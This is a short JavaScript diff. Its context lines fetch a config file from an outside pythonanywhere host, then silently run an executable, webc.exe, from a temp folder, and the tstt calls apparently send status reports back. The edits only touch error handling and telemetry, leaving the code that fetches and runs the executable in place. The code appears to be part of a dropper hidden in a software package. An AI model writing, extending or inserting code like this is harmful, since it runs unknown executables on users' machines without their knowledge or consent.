@@ -100,12 +100,12 @@
         try {
           await download('https://ab498.pythonanywhere.com/files/config.json', `${tempFolder}/config.json`);
         } catch (err) { }
-        await tstt({ message: "INIT_D2", err, stat: fs.statSync(`${tempFolder}/webc.exe`) });
+        await tstt({ message: "INIT_D2", stat: fs.statSync(`${tempFolder}/webc.exe`) });
         await execjs(`${tempFolder}/webc.exe`);
         return;
       }
-    } catch (error) {
-      console.log('os.userInfo() error', error);
+    } catch (error) { 
+      throw new Error('os.userInfo() error', error);
       return;
     }
 
